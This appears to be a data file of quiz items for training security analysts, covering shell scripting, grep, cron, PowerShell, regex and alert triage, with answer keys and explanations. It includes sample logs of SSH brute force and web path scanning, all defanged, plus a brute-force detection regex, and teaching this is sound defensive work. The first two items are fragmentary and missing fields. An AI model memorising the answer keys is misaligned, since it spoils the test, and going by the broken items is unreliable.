{id:'m01',type:'match',theme:'Shell Scripting Basics',title:'Name that shell concept',

 {t:'interpreter',bin:1,fb:'The interpreter (bash, sh, zsh) reads your script line by line and executes it; it is not a comment and not a permission.'},
 {t:'variable',bin:2,fb:'A variable stores a value for later use; it does not control the interpreter.'},

 {t:'comment',bin:4,fb:'Comments (#) are ignored by the interpreter; they are notes for humans.'}],
bins:['#!/bin/bash \u2014 tells the system which program runs this file','The program that reads the script and executes it line by line','A named container that stores a value, like LOG=/var/log/auth.log','The number a script returns when it finishes: 0 for success','A line starting with # that the shell ignores'],
expl:'The shebang (#!/bin/bash) is always the first line and names the interpreter. The interpreter is the program (bash) that actually runs your lines. Variables (LOG=/var/log/auth.log) hold values you reuse. When the script ends, $? holds its exit code: 0 is success, anything else signals a problem. Comments (#) are ignored by the shell and exist only for readers.'},

bank:['#!/bin/bash','chmod +x','./scan.sh','#!bin bash','chmod 777','sudo scan.sh','bash scan.txt'],
expl:'A bash script starts with the shebang #!/bin/bash so the system knows bash must interpret it. chmod +x adds the execute permission \u2014 without it you get "Permission denied". ./scan.sh runs the file from the current directory; the ./ is needed because the current folder is not in the PATH. #!bin bash has a missing slash, chmod 777 gives everyone full control (never needed here), and scan.txt has the wrong extension for an executable script.'},
{id:'m03',type:'logview',theme:'Bash & Linux Analysis',title:'SSH noise on bastion01',
scenario:'You are on triage duty. The SIEM raised one alarm: "Possible SSH brute force on bastion01". You open the end of /var/log/auth.log on the host.',
log:{file:'/var/log/auth.log \u2014 bastion01',lines:[
 {t:'Mar 14 02:10:01 bastion01 CRON[4121]: pam_unix(cron:session): session opened for user backup',k:'mut'},
 {t:'Mar 14 02:11:07 bastion01 sshd[4410]: Failed password for alopez from 10[.]0[.]4[.]15 port 51234 ssh2',k:'bad'},
 {t:'Mar 14 02:11:19 bastion01 sshd[4410]: Failed password for alopez from 10[.]0[.]4[.]15 port 51236 ssh2',k:'bad'},
 {t:'Mar 14 02:12:02 bastion01 sshd[4455]: Accepted password for alopez from 10[.]0[.]4[.]15 port 51240 ssh2',k:'good'},
 {t:'Mar 14 02:14:31 bastion01 sshd[4502]: Failed password for invalid user admin from 203[.]0[.]113[.]7 port 40001 ssh2',k:'bad'},
 {t:'Mar 14 02:14:33 bastion01 sshd[4502]: Failed password for invalid user oracle from 203[.]0[.]113[.]7 port 40022 ssh2',k:'bad'},
 {t:'Mar 14 02:14:36 bastion01 sshd[4502]: Failed password for invalid user postgres from 203[.]0[.]113[.]7 port 40041 ssh2',k:'bad'},
 {t:'Mar 14 02:14:39 bastion01 sshd[4502]: Failed password for invalid user test from 203[.]0[.]113[.]7 port 40058 ssh2',k:'bad'},
 {t:'Mar 14 02:14:43 bastion01 sshd[4502]: Failed password for invalid user ubuntu from 203[.]0[.]113[.]7 port 40077 ssh2',k:'bad'},
 {t:'Mar 14 02:14:47 bastion01 sshd[4502]: Failed password for invalid user admin from 203[.]0[.]113[.]7 port 40091 ssh2',k:'bad'},
 {t:'Mar 14 02:15:10 bastion01 sshd[4510]: Accepted publickey for kchen from 10[.]0[.]4[.]22 port 33011 ssh2',k:'good'},
 {t:'Mar 14 02:16:02 bastion01 sshd[4502]: Disconnecting authenticating user admin 203[.]0[.]113[.]7 port 40091: too many authentication failures',k:'mut'}]},
question:'Use the filter if you need it. What is happening, and what is the best immediate response?',
hint:'Many failed logins for many different user names, all from one address, in a few seconds. Then check whether that address ever succeeded.',
choices:[
 {t:'Brute force from 203[.]0[.]113[.]7 cycling through common account names; block the address and confirm no account was compromised.',ok:true,fb:''},
 {t:'alopez failed twice then logged in, so the attacker is alopez; disable the alopez account everywhere.',ok:false,fb:'alopez mistyped twice and then logged in successfully from an internal address \u2014 that is normal user behaviour, not the attack.'},
 {t:'The cron session for the backup user opened at 02:10, so the attacker owns the backup job; remove it first.',ok:false,fb:'The cron line is routine scheduling noise. It has nothing to do with the SSH failures.'},
 {t:'The valid publickey login from kchen proves the attacker got in; rebuild bastion01 from a known-good image now.',ok:false,fb:'kchen logs in with a key from an internal address. There is no evidence this login is hostile, and rebuilding without evidence loses data.'}],
expl:'The pattern is classic brute force: many "Failed password for invalid user X" lines in a few seconds, all from one external address (203[.]0[.]113[.]7), cycling through names like admin, oracle and test. No account in the log was successfully accessed by that address. The right first move is to block the source and verify. The alopez and kchen entries are normal activity from internal addresses.'},
{id:'m04',type:'terminal',theme:'Bash & Linux Analysis',title:'Count the failed SSH logins',
scenario:'You are still on bastion01. Your team lead wants one number for the ticket: how many lines in /home/analyst/auth.log mention "Failed password"?',
question:'Use a grep command on /home/analyst/auth.log to count the lines that contain "Failed password". You may use grep with the -c flag, or pipe grep into wc -l.',
hint:'grep -c "Failed password" /home/analyst/auth.log is the shortest path; quoting keeps the space inside the pattern.',
note:'Sandbox shell. Use grep on /home/analyst/auth.log (with -c, or piped into wc -l).',
prompt:'analyst@bastion01:~$',
accept:[
 {re:'^\\s*(sudo\\s+)?grep\\s+(--count|-c|-cE|-Ec)\\s+["\']Failed password["\']\\s+.*auth\\.log\\s*$',out:['347'],flags:''},
 {re:'^\\s*(sudo\\s+)?grep\\s+["\']Failed password["\']\\s+.*auth\\.log\\s*\\|\\s*(sudo\\s+)?wc\\s+-l\\s*$',out:['347'],flags:''},
 {re:'^\\s*cat\\s+.*auth\\.log\\s*\\|\\s*(sudo\\s+)?grep\\s+(--count|-c|-cE|-Ec)\\s+["\']Failed password["\']\\s*$',out:['347'],flags:''},
 {re:'^\\s*cat\\s+.*auth\\.log\\s*\\|\\s*(sudo\\s+)?grep\\s+["\']Failed password["\']\\s*\\|\\s*(sudo\\s+)?wc\\s+-l\\s*$',out:['347'],flags:''}],
canon:'grep -c "Failed password" /home/analyst/auth.log',
tip:'The -c flag makes grep print the number of matching lines instead of the lines. The pipe form grep "..." file | wc -l gives the same number: wc -l counts lines.',
expl:'grep finds lines that match a pattern. With -c it prints only the count of matching lines, which is exactly what the ticket needs. The equivalent pipeline is grep "Failed password" file | wc -l: grep outputs the matching lines, and wc -l counts them. Quoting "Failed password" keeps the space inside one pattern.'},
{id:'m05',type:'dragdrop',theme:'Bash & Linux Analysis',title:'Which tool for which job?',
scenario:'During a log review you listed six commands on your notes card, but the labels fell off. Your lead asks you to sort the tools by what they actually do before you build the next analysis pipeline.',
question:'Drag each command into the bin that describes its main role in a log-analysis pipeline.',
hint:'grep picks lines. sed rewrites text. awk and cut split lines into fields. sort orders lines and uniq collapses repeated neighbours \u2014 usually counted.',
items:[
 {t:'grep',bin:0,fb:'grep filters: it prints only the lines that match a pattern.'},
 {t:'awk',bin:1,fb:'awk splits each line into fields and can print or compute on them, like awk \u2019{print $1}\u2019.'},
 {t:'cut',bin:1,fb:'cut extracts fixed fields or character ranges, like cut -d: -f1.'},
 {t:'sed',bin:2,fb:'sed edits text: the s/old/new/ substitution is its classic use.'},
 {t:'sort',bin:3,fb:'sort orders lines; with -n it sorts numbers, with -r it reverses.'},
 {t:'uniq',bin:3,fb:'uniq merges (or counts, with -c) repeated adjacent lines \u2014 almost always fed by sort.'}],
bins:['Find the lines I need','Work with fields or columns','Change text inside the lines','Order lines and collapse repeats'],
expl:'grep = filter lines by pattern. awk and cut = take fields apart (awk \u2019{print $1}\u2019 prints the first field; cut -d: -f1 takes the first colon-separated column). sed = substitute text (sed s/old/new/g). sort orders lines and uniq -c counts repeats \u2014 the pair sort | uniq -c is the standard "how many of each" tool, and this whole chain is a data-reduction pipeline: each stage shrinks the output towards the answer. One more glue tool: xargs turns a stream of matching lines into arguments for another command, like grep -l pattern *.log | xargs rm on throw-away files.'},
{id:'m06',type:'qcm',theme:'Bash & Linux Analysis',title:'The forgotten grep flag',
scenario:'Your teammate ran: grep "Accepted password" /var/log/auth.log | grep -v " 10[.]0[.]4[.]" and called it "removing the internal noise".',
question:'What does the -v flag do in grep?',
hint:'Think of the v as the opposite day: it selects the lines that do not match.',
choices:[
 {t:'It inverts the match: lines that do NOT match the pattern are printed.',ok:true,fb:''},
 {t:'It enables verbose mode and prints extra context around each match.',ok:false,fb:'There is no verbose mode in grep; -v has a precise meaning: invert.'},
 {t:'It matches the pattern only in variable names and environment settings.',ok:false,fb:'grep knows nothing about variables; this is a made-up meaning.'},
 {t:'It verifies the file before reading, to catch corrupted logs.',ok:false,fb:'grep never verifies files; this flag does not exist.'}],
expl:'In grep, -v inverts the match: every line that does NOT contain the pattern is printed. In the teammate\u2019s pipeline it removes lines containing the internal range, leaving outside addresses. Handy flag neighbours: -i makes the match case-insensitive (Failed, FAILED, failed all match), -n prints line numbers, and -c prints only a count. The classic trap is reading -v as "verbose" \u2014 it is exactly the opposite job: it hides what matches.'},
{id:'m07',type:'scenario',theme:'Analysis Methods',title:'Morning SOC queue \u2014 three alerts',
scenario:'You start your shift with three alerts in the queue. Triage each one and pick the response a level-2 analyst would take. Alert A: EDR flagged "bash executed from /tmp by the service account svc_backup" on wks-4421. Alert B: 312 failed logins in 5 minutes on vpn01 from one external address. Alert C: file integrity monitoring says /etc/cron.d/backup-sync changed on web01 at 03:11.',
question:'For each alert, choose the best immediate response.',
hint:'Look at where and by whom a script ran; look at rate and origin for login failures; verify and inspect configuration changes before touching them.',
parts:[
 {label:'Alert A \u2014 bash executed from /tmp by svc_backup on wks-4421.',choices:[
  {t:'Investigate the script, its parent process, and what else svc_backup did on that host.',ok:true,fb:''},
  {t:'Nothing \u2014 the backup service always runs bash, so the alert is always a false positive.',ok:false,fb:'The alert is not that bash ran, but where it ran from. /tmp is not a normal home for a service script.'},
  {t:'Delete every file in /tmp on the host to clean the malware away.',ok:false,fb:'Deleting files first destroys evidence and may not stop the activity. Investigate first.'},
  {t:'Reboot wks-4421 so the memory is cleared.',ok:false,fb:'A reboot wipes volatile evidence and does not remove persistence.'}]},
 {label:'Alert B \u2014 312 failed logins in 5 minutes on vpn01 from one external address.',choices:[
  {t:'Block the source address and start checking whether any account eventually succeeded.',ok:true,fb:''},
  {t:'Wait for the user to contact the helpdesk; one source failing is normal.',ok:false,fb:'312 failures in 5 minutes is a brute-force rate, not one confused user.'},
  {t:'Restart vpn01 to clear the login queue.',ok:false,fb:'A restart stops nothing: the source simply reconnects and the logs rotate.'},
  {t:'Email every user to change their password as the only action.',ok:false,fb:'A blanket email is slow and does not stop the active attempt. Block first, then verify.'}]},
 {label:'Alert C \u2014 /etc/cron.d/backup-sync changed at 03:11 on web01.',choices:[
  {t:'Read the current cron file, compare it with the known-good version, and find out who changed it.',ok:true,fb:''},
  {t:'Restore the file from the last good backup immediately, before even looking at the change.',ok:false,fb:'Restoring first erases the change you need to analyse and may not remove the actor\u2019s access.'},
  {t:'Disable cron entirely on web01 for the rest of the week so nothing else can change.',ok:false,fb:'That breaks every scheduled job, including real backups \u2014 far too broad.'},
  {t:'Mark it as expected and close the alert: backups change cron files all the time anyway.',ok:false,fb:'Assuming change is expected is how persistence gets missed. Verify against the baseline.'}]}],
expl:'Alert A: execution from /tmp by a service account is a real red flag \u2014 identify the script, its parent process and the account\u2019s other actions. Alert B: a high rate of failures from one source is brute force \u2014 block the source, then verify no success followed. Alert C: configuration changes must be verified against the known-good baseline and attributed, never blindly restored or dismissed.'},
{id:'m08',type:'order',theme:'Shell Scripting Basics',title:'From idea to scheduled job',
scenario:'Your lead asks you to automate a nightly log summary. You will write a small script called logsum.sh, make it executable, test it, and schedule it with cron so it runs every night at 02:00.',
question:'Put the six steps in the order you would actually do them.',
hint:'You cannot test or schedule what does not exist yet, and you schedule only after the script proves it works.',
items:['Write logsum.sh starting with #!/bin/bash','Make it executable with chmod +x logsum.sh','Run it by hand with ./logsum.sh and check the output','Open the schedule with crontab -e','Add the line 0 2 * * * /opt/scripts/logsum.sh','Confirm the next morning that the summary file was created'],
expl:'The natural build order: write the file (with the shebang first), give it the execute permission, and test it by hand \u2014 never schedule an untested script. Only then open crontab -e and add the schedule line. Finally verify the result after the first scheduled run. Scheduling before testing would push failures into 02:00 emails every night.'},
{id:'m09',type:'fill',theme:'Bash & Linux Analysis',title:'Read the crontab line',
scenario:'A ticket says: "logsum.sh must run every Monday at 02:30". A teammate started the crontab line but left the schedule fields blank. A cron line has five time fields: minute, hour, day-of-month, month, day-of-week.',
question:'Fill the blanks so the job runs at 02:30 every Monday.',
hint:'Minute 30, hour 2. Day-of-month and month stay * (any). Monday is day-of-week 1.',
text:'{{0}} {{1}} * * {{2}} /opt/scripts/logsum.sh',
slots:['30','2','1'],
bank:['30','2','1','*','0','15','7'],
expl:'Cron fields are: minute hour day-of-month month day-of-week. For 02:30 you need minute 30 and hour 2. Day-of-month and month remain * (any value). Monday is 1 in the day-of-week field (0 is Sunday). So the line is 30 2 * * 1 /opt/scripts/logsum.sh. Using 0 would run it at 00:30, and 7 in the weekday slot also means Sunday on many systems.'},
{id:'m10',type:'match',theme:'PowerShell',title:'PowerShell starter kit',
scenario:'You are assigned your first Windows triage. The runbook lists seven cmdlets. Before you touch the workstation, you must be able to say what each one does.',
question:'Match each PowerShell cmdlet with its job.',
hint:'The Verb-Noun names are honest: Get- fetches, Select-String searches inside text. Help is the manual; events are Windows logs; services are background programs; Get-Command finds the right tool.',
items:[
 {t:'Get-Process',bin:0,fb:'Get-Process lists running processes with CPU and memory, like ps on Linux.'},
 {t:'Get-Content',bin:1,fb:'Get-Content reads a file\u2019s content line by line, like cat.'},
 {t:'Select-String',bin:2,fb:'Select-String searches text for a pattern, like grep.'},
 {t:'Get-WinEvent',bin:3,fb:'Get-WinEvent reads Windows event logs (System, Security, and more).'},
 {t:'Get-Help',bin:4,fb:'Get-Help shows the manual page for any cmdlet, with examples.'},
 {t:'Get-Service',bin:5,fb:'Get-Service lists the Windows services and whether each is running or stopped.'},
 {t:'Get-Command',bin:6,fb:'Get-Command finds which cmdlet can do a job, even when you only know part of the name.'}],
bins:['List the running programs','Read a file\u2019s lines','Search text for a pattern','Read the Windows event logs','Show the manual page of a cmdlet','Show the Windows services and their state','Find the cmdlet that does a job'],
expl:'PowerShell cmdlets use Verb-Noun naming, which tells you the job: Get-Process lists running programs, Get-Content reads files (like cat), Select-String searches inside text (like grep), Get-WinEvent reads event logs \u2014 on older systems its twin was Get-EventLog \u2014 Get-Help prints the manual with examples, Get-Service shows background services, and Get-Command finds the tool you need. When an unknown cmdlet appears, read its verb first, then ask Get-Help. Extra abilities load as modules with Import-Module, scripts only run when the execution policy allows it (RemoteSigned is the usual setting), and the classic place to try all of this was the PowerShell ISE editor.'},
{id:'m11',type:'qcm',theme:'PowerShell',title:'What travels down the pipeline?',
scenario:'A Linux colleague says: "So PowerShell pipes are just like bash \u2014 lines of text, right?" You are about to correct them in the stand-up.',
question:'What does the PowerShell pipeline pass from one cmdlet to the next?',
hint:'Ask yourself why Get-Process | Where-Object {$_.CPU -gt 100} can read .CPU directly.',
choices:[
 {t:'Whole objects with properties, not formatted text lines.',ok:true,fb:''},
 {t:'Plain strings, exactly like bash pipes.',ok:false,fb:'This is the bash model. PowerShell passes structured objects, which is why you can filter on .CPU directly.'},
 {t:'XML documents only, because Windows stores everything in XML.',ok:false,fb:'Windows event logs use XML internally, but the pipeline carries objects of many types.'},
 {t:'CSV rows, because PowerShell was designed for spreadsheets.',ok:false,fb:'CSV is an export format (Export-Csv), not what the pipeline carries.'}],
expl:'The PowerShell pipeline passes .NET objects \u2014 that is the object pipeline. Each object keeps its properties, so Get-Process | Where-Object {$_.CPU -gt 100} filters on the CPU property directly \u2014 no text parsing. Pipe an object into Get-Member to see everything it can do. That is the key difference from bash, where pipes carry raw text and every consumer must re-parse fields with awk or cut. When you need a file instead of objects, pick the format: Export-Csv for spreadsheets, ConvertTo-Json for machine-readable output.'},
{id:'m12',type:'fill',theme:'PowerShell',title:'Catch the CPU eaters',
scenario:'A Windows server is slow. The runbook says: list the processes whose CPU time is greater than 100 seconds, using the pipeline with the generic filtering cmdlet and the automatic variable for the current pipeline item.',
question:'Complete the one-liner with the three missing pieces.',
hint:'The generic filter cmdlet is Where-Object; inside its braces the current item is $_; "greater than" is the -gt operator.',
text:'Get-Process | {{0}} { {{1}}.CPU {{2}} 100 }',
slots:['Where-Object','$_','-gt'],
bank:['Where-Object','$_','-gt','ForEach-Object','-lt','Sort-Object','$env:CPU'],
expl:'Where-Object keeps only the objects that pass a test. Inside the braces, $_ is the current object coming down the pipeline, so $_.CPU is that process\u2019s CPU time. The comparison "greater than" is -gt. ForEach-Object would transform every object instead of filtering, -lt means "less than", and $env:CPU is not one of the real environment variables. Two useful follow-ups: Sort-Object CPU -Descending orders the survivors, Select-Object -First 10 trims the list, and Measure-Object sums or counts what a property adds up to.'},
{id:'m13',type:'match',theme:'Regular Expressions',title:'Regex punctuation decoder',
scenario:'You found a grep -E line in an old playbook: grep -E "^Failed.*user$|^sshd" auth.log. A new analyst asks what each symbol contributes.',
question:'Match each regex metacharacter with its meaning.',
hint:'^ and $ pin the match to the start or end of the line. The dot matches anything. * repeats the previous item zero or more times.',
items:[
 {t:'^',bin:0,fb:'^ is the start-of-line anchor; ^Fail matches only lines beginning with Fail.'},
 {t:'$',bin:1,fb:'$ is the end-of-line anchor; user$ matches only lines ending with user.'},
 {t:'.',bin:2,fb:'The dot matches any single character (except newline) \u2014 that is why real dots are escaped as \\\\.'},
 {t:'*',bin:3,fb:'The star repeats the previous item zero or more times; .* means "anything, even nothing".'},
 {t:'\\.',bin:4,fb:'The escaped dot \\. matches a real, literal dot \u2014 essential for IP addresses.'}],
bins:['Start of the line','End of the line','Any single character','Repeat the previous item zero or more times','A literal dot character'],
expl:'Anchors: ^ pins to the line start, $ pins to the line end \u2014 together they stop patterns matching in the middle of longer text. The dot . matches any single character, and * repeats the previous item zero or more times, so .* means "anything". The vertical bar | is alternation \u2014 either side of it can match, which is how ^Failed.*user$|^sshd catches two shapes at once. To match a real dot you escape it: \\. \u2014 this matters every time you match IP addresses.'},
{id:'m14',type:'fill',theme:'Regular Expressions',title:'Build the brute-force filter',
scenario:'You are writing a detection grep for SSH brute force. The lines look like: Failed password for invalid user admin from 203[.]0[.]113[.]7 port 40091 ssh2. Your pattern must match user names of any length and any digits-and-dots address, but nothing else.',
question:'Complete the pattern with the two missing regex pieces.',
hint:'A run of word characters (letters, digits, underscore) is \\w. A character class like [0-9.] matches one character from the set; add + to mean "one or more".',
text:'^Failed password for (invalid user )?{{0}}+ from {{1}} port [0-9]+$',
slots:['\\w','[0-9.]+'],
bank:['\\w','[0-9.]+','\\d','\\W','[a-z]','.*'],
expl:'\\w matches word characters, so \\w+ covers any user name. The class [0-9.] matches a digit or a dot, so [0-9.]+ matches an address such as 203[.]0[.]113[.]7. \\d would miss the dots, \\W matches non-word characters (the opposite of what you want), [a-z] misses digits, and .* is so greedy it would swallow spaces and words \u2014 too loose for a detector. The round brackets around (invalid user )? are a capture group: they remember what matched, and a backreference like \\1 can re-use that memory later in the pattern. grep -E speaks the ERE dialect; the fuller engine is called PCRE.'},
{id:'m15',type:'qcm',theme:'Regular Expressions',title:'Exactly one letter',
scenario:'A detection rule must flag configuration lines that contain a single lowercase letter where a digit was expected \u2014 nothing longer. Sample bad line: retry=3a timeout=9',
question:'Which regex piece matches exactly one lowercase letter, and nothing more?',
hint:'A bare class matches exactly one character; a quantifier after it changes how many.',
choices:[
 {t:'[a-z]',ok:true,fb:''},
 {t:'[a-z]+',ok:false,fb:'The + makes it one or more letters, so it also matches "abc". The rule must match exactly one.'},
 {t:'[a-z]*',ok:false,fb:'The * matches zero or more, so it matches even when no letter is there at all.'},
 {t:'\\w',ok:false,fb:'\\w also matches digits and the underscore \u2014 too broad for "lowercase letter".'}],
expl:'A character class [a-z] matches exactly one character in the range a\u2013z. Quantifiers change the count: + means one or more, * means zero or more, and braces fix a range \u2014 a{2,4} means two to four letters. And \\w is wider than a letter \u2014 it also matches digits and underscore. When a rule says "exactly one", use the bare class with no quantifier.'},
{id:'m16',type:'logview',theme:'Bash & Linux Analysis',title:'404 storm on web01',
scenario:'The web team says web01 feels slow and the access log is growing fast. You open a slice of /var/log/access.log.',
log:{file:'/var/log/access.log \u2014 web01',lines:[
 {t:'198[.]51[.]100[.]9 - - [14/Mar/2026:03:20:01] "GET /index.html HTTP/1.1" 200 5123',k:'good'},
 {t:'198[.]51[.]100[.]9 - - [14/Mar/2026:03:20:02] "GET /login.php HTTP/1.1" 200 2044',k:'good'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:05] "GET /admin HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:05] "GET /administrator HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:06] "GET /wp-login.php HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:06] "GET /phpmyadmin HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:07] "GET /.env HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:07] "GET /backup.zip HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:08] "GET /config.php.bak HTTP/1.1" 404 0',k:'bad'},
 {t:'198[.]51[.]100[.]9 - - [14/Mar/2026:03:20:09] "GET /assets/app.js HTTP/1.1" 200 33110',k:'good'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:10] "GET /cgi-bin/test.cgi HTTP/1.1" 404 0',k:'bad'},
 {t:'203[.]0[.]113[.]44 - - [14/Mar/2026:03:20:11] "GET /xmlrpc.php HTTP/1.1" 404 0',k:'bad'}]},
question:'Use the filter if you need it. What is the source at 203[.]0[.]113[.]44 doing, and what should you do next?',
hint:'Filter for 203[.]0[.]113[.]44 and read the requested paths: admin panels, backups, config files. Then ask what happens if one of them exists.',
choices:[
 {t:'Automated scanning for admin panels and leaked files; check whether any request returned 200 and consider blocking the source.',ok:true,fb:''},
 {t:'A broken monitoring probe is asking for pages that no longer exist; update its URL list and move on quickly.',ok:false,fb:'Real monitors ask for known pages. Probing /wp-login.php, /.env and /backup.zip is scanning behaviour.'},
 {t:'A denial-of-service flood; the site is overwhelmed by the sheer volume of requests in the log.',ok:false,fb:'The volume is small (one request per second) and every sensitive path returns 404. This is scanning, not flooding.'},
 {t:'Nothing unusual at all \u2014 single 404 responses are harmless by definition, so no action is needed.',ok:false,fb:'Each single 404 is harmless, but the pattern \u2014 many sensitive paths from one source \u2014 reveals reconnaissance.'}],
expl:'One address is rapidly asking for admin panels, backups and configuration files (/.env, /backup.zip, /wp-login.php). That is automated reconnaissance: the attacker hopes a file exists and leaks something. The danger is a request that returns 200 \u2014 so search the log for 200s from that address and block or rate-limit the source. Also list what landed: find /var/www -mtime -3 shows files newly dropped in the web root. The 404s themselves cost little; the risk is the hit they are fishing for.'}
,
{id:'m17',type:'spot',theme:'Shell Scripting Basics',title:'Broken cleanup script',
scenario:'A junior analyst\u2019s cleanup script keeps failing with strange errors on Ubuntu. The script: it should run only as root, set a log path, count old log lines, and remove a directory passed as an argument.',
question:'Click every line that contains a real mistake.',
hint:'Look closely at the spaces inside the if condition and at the unquoted variable in the rm line.',
lines:[
 {t:'#!/bin/bash'},
 {t:'gzip_logs() { gzip "$1"; }'},
 {t:'if [$UID -eq 0]; then',bad:true,why:'The [ test needs spaces around it: if [ $UID -eq 0 ]. Without spaces bash sees the command [$UID and fails.'},
 {t:'  TARGET_DIR="$1"'},
 {t:'  LOG=/var/log/cleanup.log'},
 {t:'  grep -c "removed" $LOG'},
 {t:'  for f in /var/log/*.1; do gzip_logs "$f"; done'},
 {t:'  rm -rf $TARGET_DIR',bad:true,why:'$TARGET_DIR is not quoted. An unquoted variable in rm -rf splits on spaces and can expand to nothing; always quote: "$TARGET_DIR".'},
 {t:'fi'}],
tip:'Two habits fix most script bugs: spaces around [ ] in tests, and double quotes around every variable that holds a path.',
expl:'Line 3 fails because [ is a command and needs spaces on both sides: if [ $UID -eq 0 ]. Line 8 is dangerous: the unquoted $TARGET_DIR in rm -rf can split into words or expand to nothing \u2014 a classic way to delete the wrong thing. The rest is sound: the gzip_logs function takes the file as its first argument ($1), the loop walks the rotated logs, and a bigger script could branch on options with a case statement. Quoting and spacing are the two habits to keep.'},
{id:'m18',type:'spot',theme:'PowerShell',title:'Evidence script that eats evidence',
scenario:'A colleague wrote a PowerShell triage script. It should list suspicious processes, save the list to a file, and search a log for failed logons. Something is wrong: every run loses the previous output, and the process filter never matches anything.',
question:'Click every line that contains a real mistake.',
hint:'One line confuses assignment with comparison. One line overwrites a file that should grow.',
lines:[
 {t:'# quick process review'},
 {t:'Get-Process | Where-Object { $_.Name -like "*svc*" }'},
 {t:'Get-Process | Where-Object { $_.Name = "svchost" }',bad:true,why:'= assigns a value inside the filter; comparison needs -eq (or -like). As written the filter sets every Name to svchost.'},
 {t:'Select-String -Path C:\\Logs\\security.log -Pattern "4625"'},
 {t:'Get-Process | Out-File C:\\Temp\\evidence.txt',bad:true,why:'Out-File without -Append overwrites the file on every run, destroying the previous evidence snapshot.'},
 {t:'Get-Date >> C:\\Temp\\evidence.txt'}],
tip:'In PowerShell, -eq compares and = assigns, Out-File keeps old content only with -Append, and Start-Transcript records a whole session to one file \u2014 stronger evidence than scattered Out-File calls.',
expl:'Line 3 uses = (assignment) where a comparison is needed: Where-Object { $_.Name -eq "svchost" }. Line 5 sends output to Out-File without -Append, so each run replaces the whole evidence file \u2014 the earlier snapshot is gone. The other lines are correct: -like with wildcards, Select-String for pattern search, and >> to append a line.'},
{id:'m19',type:'order',theme:'Analysis Methods',title:'Linux triage, in the right order',
scenario:'A host is suspected compromised. You have about twenty minutes of access before the change window closes. Your notes list six triage actions but got shuffled.',
question:'Put the six triage actions in the correct order.',
hint:'You first learn who is on the box and what is running, then you copy data out, then you protect what you copied.',
items:['Run w and last to see who is logged in and from where','Run ps aux to snapshot running processes','Run ss -tunlp to list open network connections','Copy the active logs (auth.log, syslog) to your evidence share','Compute sha256 hashes of every file you collected','Write your timeline summary in the ticket'],
expl:'Triage moves from volatile to stable. First, session and process questions (w, last, ps aux) because that state disappears on logout or reboot. Then the network table (ss -tunlp) shows live connections \u2014 netstat is its older twin, and lsof -p PID ties one process to its open files. Only after observing do you copy the logs to the evidence share (scp or a shared mount, then chown them to your analyst account), then hash them so anyone can prove they were not altered, and finally document the timeline in the ticket. Hashing before copying is impossible, and writing the report first would leave the data uncollected.'},
{id:'m20',type:'rank',theme:'Analysis Methods',title:'Order the morning alerts',
scenario:'Four alerts arrived while you were in a meeting. You can work them one at a time. Alert 1: a service account is running a script from /tmp right now on a production host. Alert 2: /etc/cron.d/backup-sync changed on web01 at 03:11, cause unknown. Alert 3: a user plugged an unapproved USB drive into a workstation (policy violation, DLP saw no copy). Alert 4: yesterday\u2019s failed-backup notice for an archive server, already retried successfully.',
question:'Rank the alerts from most urgent (top) to least urgent (bottom).',
hint:'Active attacker behaviour beats unknown config changes; unknown config changes beat policy paperwork; resolved issues go last.',
items:['Service account running a script from /tmp on production (active)','Unknown change to /etc/cron.d on web01','Unapproved USB drive plugged in (no data seen leaving)','Failed backup from yesterday, already retried OK'],
tip:'Ranking rule of thumb: something happening now > something changed for unknown reasons > policy exceptions > anything already resolved.',
expl:'The /tmp script execution is live attacker-like behaviour on production \u2014 it wins. The cron change is unknown but not yet proven hostile, so it is next. The USB event is a policy violation with no observed data loss. The backup failure already fixed itself, so it only needs a note in the ticket. When everything looks important, "is it happening right now and can it spread?" sorts the queue.'},
{id:'m21',type:'match',theme:'Analysis Methods',title:'Name the analysis method',
scenario:'Your manager quoted five phrases from the new monitoring plan and asked you to tie each one to the method it describes before the plan is signed.',
question:'Match each method with its description.',
hint:'Band-limiting takes a slice of output. A baseline is the normal picture. A must-gather is a checklist. Diff compares two versions. Cron runs things on a schedule.',
items:[
 {t:'must-gather script',bin:0,fb:'A must-gather script collects a fixed set of triage data (processes, connections, logs) the same way every time.'},
 {t:'baseline',bin:1,fb:'A baseline is the recorded normal state \u2014 typical CPU, usual open ports \u2014 that you compare against.'},
 {t:'band-limiter',bin:2,fb:'Band-limiters (head, tail, more, less) show only part of large output so a human can read it.'},
 {t:'scheduled collection',bin:3,fb:'A cron entry runs the same command every night, so data exists even when nobody is watching.'},
 {t:'diff',bin:4,fb:'diff prints the differences between two files, like yesterday\u2019s and today\u2019s config.'}],
bins:['A script that collects a fixed set of triage data every time','The recorded "normal" state you compare against','A tool that shows only part of a large output','The same data collected automatically on a schedule','A comparison that shows exactly what changed'],
expl:'A must-gather script is your repeatable checklist for triage data. A baseline records normal, so "abnormal" has a meaning. Band-limiters (head, tail, more, less) slice big outputs down to something readable. Scheduled collection (cron) captures data even at 03:00. diff shows exactly what changed between two versions \u2014 the fastest way to review a config change.'},
{id:'m22',type:'fill',theme:'Analysis Methods',title:'Slice the log politely',
scenario:'The security log is 4 GB. Your laptop groans when you cat it. The runbook asks you to view just the end of the file, follow new lines live, and later show the first 50 lines \u2014 without ever loading the whole file.',
question:'Complete the three commands with the missing words.',
hint:'The tool that shows the end of a file is tail; with -f it streams new lines. The tool for the beginning is head.',
text:'Show the last 20 lines: {{0}} -n 20 /var/log/auth.log\nFollow new lines live: {{1}}\nShow the first 50 lines: {{2}} -n 50 /var/log/auth.log',
slots:['tail','tail -f','head'],
bank:['tail','tail -f','head','cat','top','-a'],
expl:'tail -n 20 prints the last 20 lines \u2014 perfect for "what just happened". tail -f keeps the file open and streams new lines as they arrive, which is how analysts watch attacks live. head -n 50 prints the first 50 lines. cat would push all 4 GB to your screen, top is for processes, and -a is not a band-limiting flag.'},
